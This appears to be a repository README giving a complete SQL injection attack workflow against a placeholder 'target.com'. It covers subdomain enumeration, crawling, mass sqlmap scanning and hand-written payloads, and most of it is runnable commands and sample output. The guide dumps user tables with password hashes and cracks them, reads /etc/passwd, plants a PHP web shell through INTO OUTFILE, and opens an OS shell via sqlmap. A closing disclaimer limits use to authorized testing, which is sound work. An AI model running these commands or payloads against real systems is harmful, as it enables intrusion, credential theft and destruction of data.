# SQL Injection Testing - Complete Practical Guide

## 📋 Table of Contents
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Crawling & URL Discovery](#phase-2-crawling--url-discovery)
- [Phase 3: Parameter Discovery](#phase-3-parameter-discovery)
- [Phase 4: Automated Scanning](#phase-4-automated-scanning)
- [Phase 5: Manual Testing](#phase-5-manual-testing)
- [Phase 6: Exploitation](#phase-6-exploitation)
- [Complete Workflow Example](#complete-workflow-example)
- [Tools Installation](#tools-installation)
- [Cheat Sheet](#cheat-sheet)
- [Legal Disclaimer](#legal-disclaimer)

---

## 🎯 Introduction

This guide provides a **step-by-step methodology** for testing SQL injection vulnerabilities in web applications. Perfect for:
- Penetration testers
- Bug bounty hunters
- Security researchers
- Ethical hackers

**Scenario:** You have a target domain (e.g., `target.com`) but don't know where vulnerabilities exist. This guide shows you how to systematically find and test for SQL injection.

---

## 🔧 Prerequisites

### Required Tools (All FREE)
```bash
# Reconnaissance
- Subfinder
- Amass / Sublist3r
- httpx

# Crawling
- Katana
- Gospider
- Hakrawler

# Scanning
- SQLMap
- Nuclei
- Burp Suite Community
- OWASP ZAP

# Manual Testing
- Firefox/Chrome with Developer Tools
- Burp Suite
```

### Kali Linux Setup
Most tools are pre-installed in Kali Linux. For missing tools, see [Installation Section](#tools-installation).

---

## 🔍 Phase 1: Reconnaissance

### Goal
Find all subdomains and live hosts associated with the target domain.

### Step 1.1: Subdomain Enumeration

**Using Subfinder (Recommended):**
```bash
subfinder -d target.com -o subdomains.txt
```

**Using Amass:**
```bash
amass enum -d target.com -o subdomains.txt
```

**Using Sublist3r:**
```bash
sublist3r -d target.com -o subdomains.txt
```

### Step 1.2: Check Live Hosts

```bash
cat subdomains.txt | httpx -o live_hosts.txt
```

**Output Example:**
```
https://www.target.com
https://admin.target.com
https://shop.target.com
https://api.target.com
```

### Step 1.3: Technology Detection

**Using WhatWeb:**
```bash
whatweb target.com -v
```

**Using Wappalyzer (Browser Extension):**
- Install Wappalyzer extension
- Visit target site
- Check detected technologies (PHP, MySQL, WordPress, etc.)

**Why This Matters:**
- MySQL sites → Use MySQL-specific payloads
- MSSQL sites → Use MSSQL-specific payloads
- WordPress → Check for vulnerable plugins

---

## 🕷️ Phase 2: Crawling & URL Discovery

### Goal
Discover all URLs, pages, and endpoints on the target application.

### Method 1: Katana (Modern & Fast)

```bash
# Basic crawling
katana -u https://target.com -d 3 -o urls.txt

# With form fields
katana -u https://target.com -d 3 -f -o urls_with_forms.txt

# Multiple targets
cat live_hosts.txt | katana -d 3 -o all_urls.txt
```

### Method 2: Gospider

```bash
gospider -s https://target.com -d 3 -c 10 -o output/
```

### Method 3: Hakrawler

```bash
echo "https://target.com" | hakrawler -depth 3 -plain > urls.txt
```

### Method 4: Burp Suite Spider

1. Open Burp Suite
2. Browse the target site (with proxy enabled)
3. Go to **Target → Site map**
4. Right-click domain → **Spider this host**
5. Wait for completion
6. Export URLs: **Target → Site map → Right-click → Copy URLs in this host**

### Method 5: Google Dorking

```bash
# Find pages with parameters
site:target.com inurl:id=
site:target.com inurl:product?
site:target.com inurl:page=
site:target.com inurl:category=

# Find specific file types
site:target.com filetype:php
site:target.com filetype:asp

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin
```

**Pro Tip:** Combine multiple crawling tools for maximum coverage.

---

## 🎯 Phase 3: Parameter Discovery

### Goal
Identify URLs with parameters that could be vulnerable to SQL injection.

### Step 3.1: Filter URLs with Parameters

```bash
# Extract URLs with GET parameters
cat urls.txt | grep "?" > params_urls.txt

# More specific filtering
cat urls.txt | grep -E "\?|=|id|page|product|cat|search" > interesting_urls.txt
```

### Step 3.2: Parameter Discovery Tools

**Using ParamSpider:**
```bash
paramspider -d target.com -o params.txt
```

**Using Arjun:**
```bash
# Discover hidden parameters
arjun -u https://target.com/page.php

# With wordlist
arjun -u https://target.com/page.php -w /path/to/wordlist.txt
```

### Common Parameter Names to Look For:
```
id, user, product, page, cat, category, search, query, 
item, pid, cid, uid, sid, file, doc, view, show, display,
article, post, name, type, sort, order, filter, action
```

### Step 3.3: Manual Inspection

**Check robots.txt:**
```bash
curl https://target.com/robots.txt
```

**Check sitemap.xml:**
```bash
curl https://target.com/sitemap.xml
```

**Example Output:**
```
https://target.com/products.php?id=1
https://target.com/news.php?article=5
https://target.com/search.php?query=test
https://target.com/user.php?uid=10
```

---

## 🤖 Phase 4: Automated Scanning

### Goal
Use automated tools to quickly identify potential SQL injection vulnerabilities.

### Method 1: SQLMap - Single URL

**Basic Scan:**
```bash
sqlmap -u "https://target.com/product.php?id=1" --batch
```

**Aggressive Scan:**
```bash
sqlmap -u "https://target.com/product.php?id=1" \
  --batch \
  --level=3 \
  --risk=2 \
  --threads=5 \
  --random-agent
```

**With Cookies:**
```bash
sqlmap -u "https://target.com/product.php?id=1" \
  --cookie="PHPSESSID=abc123; user=admin" \
  --batch \
  --level=2
```

**POST Data:**
```bash
sqlmap -u "https://target.com/login.php" \
  --data="username=test&password=test" \
  --batch
```

### Method 2: SQLMap - Multiple URLs

**Create URL list:**
```bash
cat urls.txt | grep "?" > sqli_targets.txt
```

**Batch scanning:**
```bash
sqlmap -m sqli_targets.txt \
  --batch \
  --level=2 \
  --risk=2 \
  --threads=10 \
  --random-agent \
  --output-dir=sqlmap_results/
```

### Method 3: SQLMap - From Burp Request

**Steps:**
1. Intercept request in Burp Suite
2. Right-click → **Copy to file** → Save as `request.txt`
3. Run SQLMap:

```bash
sqlmap -r request.txt --batch --level=2 --risk=2
```

**Example request.txt:**
```
POST /login.php HTTP/1.1
Host: target.com
Cookie: session=xyz123
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123
```

### Method 4: Nuclei (Template-Based Scanner)

**SQL Injection Templates:**
```bash
# Single target
nuclei -u https://target.com -t sqli/ -o nuclei_sqli.txt

# Multiple URLs
nuclei -l urls.txt -t sqli/ -c 50 -o results.txt

# All vulnerabilities
nuclei -l urls.txt -t cves/ -t vulnerabilities/ -o all_vulns.txt
```

### Method 5: Ghauri (SQLMap Alternative)

```bash
ghauri -u "https://target.com/page?id=1" --batch --dbs
```

### Method 6: OWASP ZAP Automated Scan

```bash
# Command-line
zap-cli quick-scan -s all https://target.com

# Or use ZAP GUI for active scanning
```

---

## ✋ Phase 5: Manual Testing

### Goal
Manually verify vulnerabilities and test areas automated tools might miss.

### 5.1: Basic SQL Injection Payloads

**Test in URL parameters:**
```
Original: https://target.com/product?id=1

Test payloads:
https://target.com/product?id=1'
https://target.com/product?id=1"
https://target.com/product?id=1'--
https://target.com/product?id=1' OR '1'='1
https://target.com/product?id=1' AND '1'='2
```

**What to look for:**
- Error messages (SQL syntax errors)
- Different page behavior
- Blank pages
- Delayed responses

### 5.2: Login Form Testing

**Username field payloads:**
```
admin'--
admin'#
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
') OR ('1'='1
```

**Password field:**
```
password' OR '1'='1
' OR 1=1--
```

### 5.3: Search Form Testing

```
test'
test"
test' OR '1'='1'--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### 5.4: Testing with Burp Suite

**Steps:**
1. Intercept request in Burp Proxy
2. Send to **Repeater** (Ctrl+R)
3. Modify parameters with payloads
4. Compare responses

**Example:**
```
GET /search?q=test HTTP/1.1

Change to:
GET /search?q=test' HTTP/1.1
GET /search?q=test' OR '1'='1 HTTP/1.1
```

### 5.5: Header-Based SQL Injection

Test in Burp Suite by modifying headers:

```
User-Agent: Mozilla/5.0' OR '1'='1
X-Forwarded-For: 127.0.0.1' OR '1'='1
Referer: http://target.com' OR '1'='1
Cookie: session=abc123'; DROP TABLE users--
```

### 5.6: Time-Based Blind SQL Injection

**Manual test:**
```
# Original
https://target.com/product?id=1

# Time-based test (should delay 5 seconds if vulnerable)
https://target.com/product?id=1' AND SLEEP(5)--
https://target.com/product?id=1'; WAITFOR DELAY '0:0:5'--
```

**Use browser's Network tab to measure response time.**

---

## 💥 Phase 6: Exploitation

### Goal
Extract data from confirmed SQL injection vulnerabilities.

### 6.1: Enumerate Databases

```bash
sqlmap -u "https://target.com/product?id=1" --dbs --batch
```

**Expected Output:**
```
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db
```

### 6.2: Enumerate Tables

```bash
sqlmap -u "https://target.com/product?id=1" \
  -D webapp_db \
  --tables \
  --batch
```

**Expected Output:**
```
Database: webapp_db
[5 tables]
+-------------+
| products    |
| users       |
| orders      |
| payments    |
| admin_logs  |
+-------------+
```

### 6.3: Enumerate Columns

```bash
sqlmap -u "https://target.com/product?id=1" \
  -D webapp_db \
  -T users \
  --columns \
  --batch
```

**Expected Output:**
```
Database: webapp_db
Table: users
[5 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| username | varchar(50) |
| password | varchar(255)|
| email    | varchar(100)|
| role     | varchar(20) |
+----------+-------------+
```

### 6.4: Dump Data

**Specific table:**
```bash
sqlmap -u "https://target.com/product?id=1" \
  -D webapp_db \
  -T users \
  --dump \
  --batch
```

**Expected Output:**
```
Database: webapp_db
Table: users
[3 entries]
+----+----------+----------------------------------+-------------------+-------+
| id | username | password                         | email             | role  |
+----+----------+----------------------------------+-------------------+-------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@target.com  | admin |
| 2  | user1    | e99a18c428cb38d5f260853678922e03 | user1@target.com  | user  |
| 3  | testuser | 8d3533d75ae2c3966d7e0d4fcc69216b | test@target.com   | user  |
+----+----------+----------------------------------+-------------------+-------+
```

### 6.5: Crack Password Hashes

**Identify hash type:**
```bash
hash-identifier
# Paste hash: 5f4dcc3b5aa765d61d8327deb882cf99
# Result: MD5
```

**Crack with hashcat:**
```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Or use online tools:**
- CrackStation.net
- HashKiller.io

### 6.6: Get Database Credentials

```bash
sqlmap -u "https://target.com/product?id=1" \
  --passwords \
  --batch
```

### 6.7: OS Command Execution (Advanced)

```bash
sqlmap -u "https://target.com/product?id=1" \
  --os-shell \
  --batch
```

**If successful, you get interactive shell on server!**

---

## 🚀 Complete Workflow Example

### Scenario: Testing `example.com` from scratch

```bash
#!/bin/bash
TARGET="example.com"

echo "[+] Starting SQL Injection Testing on $TARGET"

# Phase 1: Reconnaissance
echo "[*] Phase 1: Finding subdomains..."
subfinder -d $TARGET -silent -o subdomains.txt
cat subdomains.txt | httpx -silent -o live_hosts.txt
echo "[✓] Found $(wc -l < live_hosts.txt) live hosts"

# Phase 2: Crawling
echo "[*] Phase 2: Crawling URLs..."
cat live_hosts.txt | katana -d 3 -f -silent -o all_urls.txt
echo "[✓] Found $(wc -l < all_urls.txt) URLs"

# Phase 3: Parameter Discovery
echo "[*] Phase 3: Filtering parameter URLs..."
cat all_urls.txt | grep "?" > params_urls.txt
echo "[✓] Found $(wc -l < params_urls.txt) URLs with parameters"

# Phase 4: Automated Scanning
echo "[*] Phase 4: Running SQLMap..."
sqlmap -m params_urls.txt \
  --batch \
  --level=2 \
  --risk=2 \
  --threads=10 \
  --random-agent \
  --output-dir=sqlmap_results/ \
  2>&1 | tee sqlmap.log

echo "[*] Running Nuclei..."
nuclei -l all_urls.txt \
  -t sqli/ \
  -silent \
  -o nuclei_sqli.txt

# Results Summary
echo ""
echo "[+] Scan Complete!"
echo "[*] Check results in:"
echo "    - sqlmap_results/"
echo "    - nuclei_sqli.txt"
echo "    - sqlmap.log"
```

**Save as `sqli_scanner.sh` and run:**
```bash
chmod +x sqli_scanner.sh
./sqli_scanner.sh
```

---

## 📦 Tools Installation

### Kali Linux (Most tools pre-installed)

```bash
# Update package lists
sudo apt update

# Install missing tools
sudo apt install -y sqlmap nuclei subfinder httpx

# Install Go-based tools
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Add Go bin to PATH (add to ~/.zshrc or ~/.bashrc)
export PATH=$PATH:~/go/bin
```

### Ubuntu/Debian

```bash
# Install prerequisites
sudo apt update
sudo apt install -y python3 python3-pip golang

# Install SQLMap
sudo apt install -y sqlmap

# Or install latest version
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py

# Install Go tools (same as Kali)
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

### Docker Alternative

```bash
# SQLMap in Docker
docker run --rm -it -v $(pwd):/data pwnsdx/sqlmap -u "URL" --batch

# Nuclei in Docker
docker run --rm projectdiscovery/nuclei -u https://target.com -t sqli/
```

---

## 📝 Cheat Sheet

### Quick SQLMap Commands

```bash
# Basic scan
sqlmap -u "URL" --batch

# Aggressive scan
sqlmap -u "URL" --batch --level=5 --risk=3

# With cookies
sqlmap -u "URL" --cookie="session=xxx" --batch

# POST request
sqlmap -u "URL" --data="user=test&pass=test" --batch

# From Burp request file
sqlmap -r request.txt --batch

# Multiple URLs
sqlmap -m urls.txt --batch --threads=10

# Get databases
sqlmap -u "URL" --dbs --batch

# Get tables
sqlmap -u "URL" -D dbname --tables --batch

# Dump table
sqlmap -u "URL" -D dbname -T tablename --dump --batch

# WAF bypass
sqlmap -u "URL" --tamper=space2comment --random-agent --batch

# OS shell
sqlmap -u "URL" --os-shell --batch
```

### Manual SQL Injection Payloads

**Authentication Bypass:**
```sql
admin'--
admin'#
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
') OR ('1'='1
```

**Error-Based:**
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' UNION SELECT NULL,NULL,NULL--
```

**Time-Based Blind:**
```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' OR SLEEP(5)--
```

**UNION-Based:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION ALL SELECT NULL,NULL,database()--
```

### Common SQL Commands After Exploitation

```sql
-- Get current database
SELECT database();

-- Get all databases
SELECT schema_name FROM information_schema.schemata;

-- Get tables
SELECT table_name FROM information_schema.tables WHERE table_schema='dbname';

-- Get columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Read file (MySQL)
SELECT LOAD_FILE('/etc/passwd');

-- Write file (MySQL)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## 🎓 Learning Resources

### Practice Labs (Legal & Free)
- **PortSwigger Web Security Academy** - https://portswigger.net/web-security
- **DVWA (Damn Vulnerable Web App)** - Docker: `docker run -p 80:80 vulnerables/web-dvwa`
- **bWAPP** - http://www.itsecgames.com/
- **WebGoat (OWASP)** - https://owasp.org/www-project-webgoat/
- **HackTheBox** - https://www.hackthebox.eu/
- **TryHackMe** - https://tryhackme.com/

### Bug Bounty Platforms
- HackerOne - https://www.hackerone.com/
- Bugcrowd - https://www.bugcrowd.com/
- Intigriti - https://www.intigriti.com/
- YesWeHack - https://www.yeswehack.com/

### Documentation
- SQLMap Documentation - https://github.com/sqlmapproject/sqlmap/wiki
- OWASP SQL Injection - https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQL Injection Guide - https://portswigger.net/web-security/sql-injection

---

## ⚠️ Legal Disclaimer

**IMPORTANT: Read This Before Testing**

### Legal Requirements

1. **Authorization is MANDATORY**
   - Only test applications you own OR have explicit written permission to test
   - Unauthorized testing is ILLEGAL and can result in criminal charges

2. **Scope Boundaries**
   - Stay within the defined scope of your engagement
   - Do not test systems outside authorization
   - Respect rate limits and server resources

3. **Bug Bounty Programs**
   - Read and follow the program's rules
   - Stay within scope
   - Do not test production systems unless explicitly allowed

### Responsible Disclosure

If you find vulnerabilities:
1. Report to the organization immediately
2. Do NOT publicly disclose without permission
3. Give reasonable time for fixes
4. Follow responsible disclosure practices

### This Guide Is For:
✅ Authorized penetration testing
✅ Bug bounty hunting (within scope)
✅ Educational purposes on your own systems
✅ Learning in controlled lab environments

### This Guide Is NOT For:
❌ Unauthorized testing
❌ Attacking systems without permission
❌ Malicious activities
❌ Legal violations

**You are responsible for your actions. Use this knowledge ethically and legally.**

---

## 🤝 Contributing

Found improvements or additional techniques? Contributions welcome!

1. Fork the repository
2. Create feature branch
3. Submit pull request

---

## 📞 Support & Questions

- GitHub Issues: [Create Issue]
- Twitter: [@yourusername]
- Discord: [Your Discord Server]

---

## 📜 License

MIT License - Free to use for educational and ethical purposes.

---

**Happy (Ethical) Hacking! 🔒**

Remember: With great power comes great responsibility. Always test ethically and legally.
